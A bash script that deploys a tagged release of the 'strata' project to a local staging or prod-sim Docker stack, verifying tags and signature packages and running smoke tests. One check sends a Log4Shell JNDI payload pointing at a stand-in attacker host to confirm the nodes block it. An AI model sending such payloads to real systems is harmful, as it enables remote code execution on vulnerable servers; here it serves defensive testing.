#!/usr/bin/env bash
# W09-Q-02: deploys a tagged release to staging, on this machine (Docker +
# Compose), next to the lab. Only a tag can be deployed:
#   - it must look like v<major>.<minor>.<patch>[-<pre>];
#   - it must exist on origin and point there to the same commit as here;
#   - the sources are taken from the tag itself (git archive), never from
#     the working tree, and everything is built from them.
# Staging is the lab stack (deploy/lab of that tag) under the project
# strata-staging: the lab's host ports 1xxxx become 2xxxx (UI 28088, NGINX 28080 and
# 28081, control plane 28090, Keycloak 28180, Grafana 23000...), images
# are tagged with the release, passwords and data stay in
# deploy/staging/.state and the strata-staging volumes across deploys.
#
# With --signatures <package dir> (W09-S-01), the control plane of staging
# compiles that signature package (strata-rules release, checked against
# rules/release/signatures.pub) into every bundle instead of the lab's
# sample rules, and the policies are deployed again so that the nodes run
# it; a request only the package blocks (Log4Shell, 700001) checks that.
#
# --env prod-sim (W10-G1-01) deploys the same way to a third environment
# that stands in for production until the PO names one: project
# strata-prodsim, ports 3xxxx, its own state in .state-prod-sim.
#
# --signatures may be given more than once (W11-S-01: pack v0.1 is a core
# and a signature package, RV-S-01); every package's IR goes into -rules.
#
# Usage: deploy/staging/deploy.sh [--env staging|prod-sim] [--signatures <dir>]... <tag>   deploy (build, up, smoke)
#        deploy/staging/deploy.sh [--env ...] --check <tag>                only the checks on the tag
#        deploy/staging/deploy.sh [--env ...] --status                     what is deployed
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
root="$(cd "$here/../.." && pwd)"
remote="${STAGING_REMOTE:-origin}"
env=staging
if [ "${1:-}" = "--env" ]; then env=${2:?--env staging|prod-sim}; shift 2; fi
case "$env" in
    staging) d=2 project=strata-staging state="$here/.state" ;;
    prod-sim) d=3 project=strata-prodsim state="$here/.state-prod-sim" ;;
    *) echo "staging: --env staging|prod-sim" >&2; exit 2 ;;
esac

die() { echo "$env: $*" >&2; exit 1; }

if [ "${1:-}" = "--status" ]; then
    cat "$state/deployed" 2>/dev/null || echo "$env: nothing deployed"
    exit 0
fi
check_only=0 sigs=""
if [ "${1:-}" = "--check" ]; then check_only=1; shift; fi
sigdirs=()
while [ "${1:-}" = "--signatures" ]; do sigdirs+=("$(cd "${2:?--signatures <package dir>}" && pwd)"); shift 2; done
sigs="${sigdirs[*]}"
tag="${1:-}"
[ -n "$tag" ] || die "usage: deploy.sh [--check] <tag>"

# 1. a release tag, on origin, same commit
[[ "$tag" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$ ]] \
    || die "$tag is not a release tag (v<major>.<minor>.<patch>[-<pre>])"
local_commit=$(git -C "$root" rev-parse -q --verify "refs/tags/$tag^{commit}") \
    || die "no tag $tag here (a branch or a commit cannot be deployed)"
refs=$(git -C "$root" ls-remote --tags "$remote" "refs/tags/$tag" "refs/tags/$tag^{}") \
    || die "cannot reach $remote"
# an annotated tag lists the tag object, then the commit it points to (^{})
remote_commit=$(awk -v t="refs/tags/$tag" '$2 == t "^{}" { c = $1 } $2 == t && c == "" { l = $1 } END { print (c != "" ? c : l) }' <<< "$refs")
[ -n "$remote_commit" ] || die "tag $tag is not on $remote: push it first"
[ "$remote_commit" = "$local_commit" ] \
    || die "tag $tag points to $local_commit here but to $remote_commit on $remote"
echo "$env: $tag = $local_commit (on $remote)"
[ "$check_only" = 1 ] && exit 0

# 1b. the signature package: its manifest signed by the release key, and
# every file as the manifest says
sig_irs=() sig_versions=()
for d in "${sigdirs[@]}"; do
    rel="${d#"$root"/}"
    [ "$rel" != "$d" ] || die "the signature package must be under the repository ($root)"
    (cd "$root" && deploy/dev/run.sh sh -c "cd tools/strata-rules && go run . verify --pub ../../rules/release/signatures.pub ../../$rel") \
        || die "signature package $d does not verify"
    sig_irs+=("$(ls "$d"/*.rules.json)")
    sig_versions+=("$(sed -n 's/.*"version": *"\([^"]*\)".*/\1/p' "$d/manifest.json" | head -1)")
done
sig_version=$(IFS=+; echo "${sig_versions[*]}")

# 2. the sources of the tag, and the build from them
src="$root/build/$env/$tag"
rm -rf "$src" && mkdir -p "$src"
git -C "$root" archive "$tag" | tar -x -C "$src"
(cd "$src" && deploy/dev/run.sh deploy/lab/build.sh)

# 3. the lab stack of the tag, as staging
lab="$src/deploy/lab"
for f in compose.yaml smoke.sh keycloak/strata-realm.json; do
    sed -i -E \
        -e "s/\b1(8080|8081|8088|8090|8091|8123|8180|8428|8880|3000|9000|9001)\b/$d\1/g" \
        -e "s/^name: strata-lab\$/name: $project/" \
        -e "s/strata-lab-runtime:dev/$project-runtime:$tag/g" \
        -e "s/strata-lab-ui:dev/$project-ui:$tag/g" \
        "$lab/$f"
done
grep -q "^name: $project\$" "$lab/compose.yaml" || die "compose.yaml of $tag has no project name to rewrite"
if [ -n "$sigs" ]; then
    # the package's IR in the runtime image, as the control plane's rules;
    # its cost units are those of 9,000 rules (see docs/reports/w09-s-01.md)
    files="" paths=""
    for i in "${!sig_irs[@]}"; do
        cp "${sig_irs[$i]}" "$src/build/lab/dist/signatures-$i.rules.json"
        files="$files signatures-$i.rules.json"
        paths="$paths${paths:+,}/opt/strata/signatures-$i.rules.json"
    done
    sed -i "s|^COPY rules.yaml |COPY rules.yaml$files |" "$src/build/lab/dist/Dockerfile"
    sed -i -e "s|- -rules=/opt/strata/rules.yaml|- -rules=$paths\n      - -cost-budget=${STAGING_COST_BUDGET:-2000000}|" "$lab/compose.yaml"
    grep -q 'signatures-0.rules.json' "$lab/compose.yaml" || die "compose.yaml of $tag has no -rules flag to point at the package"
fi
mkdir -p "$state"
rm -rf "$lab/.state" && ln -s "$state" "$lab/.state"
"$lab/init-env.sh" # once: staging passwords, kept across deploys
compose=(docker compose -f "$lab/compose.yaml" --env-file "$state/env")
"${compose[@]}" build
"${compose[@]}" up -d --wait --wait-timeout 900

# 4. what is deployed, then the lab smoke test against it
printf 'tag=%s\ncommit=%s\ndeployed_at=%s\n' "$tag" "$local_commit" "$(date -u +%FT%TZ)" > "$state/deployed"
[ -n "$sigs" ] && printf 'signatures=%s\nsignatures_sha256=%s\n' "$sig_version" "$(cat "${sig_irs[@]}" | sha256sum | cut -d' ' -f1)" >> "$state/deployed"
"$lab/smoke.sh"
if [ -n "$sigs" ]; then
    # the policies again, compiled with the package; then a request only
    # the package blocks
    # shellcheck disable=SC1091
    . "$state/env"
    token=$(curl -fsS http://127.0.0.1:${d}8180/realms/strata/protocol/openid-connect/token \
        -d grant_type=password -d client_id=strata-lab-cli -d "client_secret=$LAB_CLI_SECRET" \
        -d username=lab-operator --data-urlencode "password=$LAB_OPERATOR_PASSWORD" |
        sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
    [ -n "$token" ] || die "no token for lab-operator"
    api() { curl -fsS -H "Authorization: Bearer $token" -H 'Content-Type: application/json' "$@"; }
    field() { grep -o "\"$1\":\"[^\"]*\"" | head -1 | sed 's/.*:"\(.*\)"/\1/'; }
    for p in example-api example-web; do
        out=$(api -X POST "http://127.0.0.1:${d}8090/v1/policies/$p:deploy" -d '{}') || die "deploy $p: $out"
        rollout=$(field rollout_id <<<"$out")
        echo "$env: $p deployed with signatures $sig_version (bundle $(field version <<<"$out"), rollout $rollout)"
        start=$SECONDS
        until st=$(api "http://127.0.0.1:${d}8090/v1/rollouts/$rollout" | field state) && [ "$st" = DONE ]; do
            [ "$st" = FAILED ] && die "rollout $rollout failed"
            [ $((SECONDS - start)) -lt 300 ] || die "rollout $rollout not done in 300 s (state $st)"
            sleep 2
        done
    done
    for port in "${d}8080" "${d}8081"; do
        # a fresh worker can fail open on its first request with the full
        # package (#49): one probe per worker may pass, with a warning;
        # the last three must be blocked
        codes=""
        for _ in 1 2 3 4 5; do
            codes="$codes $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: api.example.test' -H 'User-Agent: ${jndi:ldap://attacker.example.test/a}' "http://127.0.0.1:$port/")"
        done
        case "$codes" in
            *" 403 403 403") ;;
            *) die "node :$port does not block Log4Shell probes (codes$codes): it does not run the package" ;;
        esac
        [ "$codes" = " 403 403 403 403 403" ] \
            || echo "$env: WARNING node :$port let its first Log4Shell probes through (codes$codes): fresh workers fail open, #49"
    done
    echo "$env: both nodes run signatures $sig_version (Log4Shell probes blocked)"
fi
# containers on their CPUs (a deploy makes new ones)
mapfile -t ids < <(docker ps -q --filter "label=com.docker.compose.project=$project")
docker update --cpuset-cpus "${STAGING_CPUS:-14-15}" "${ids[@]}" >/dev/null
echo "$env: $tag deployed"
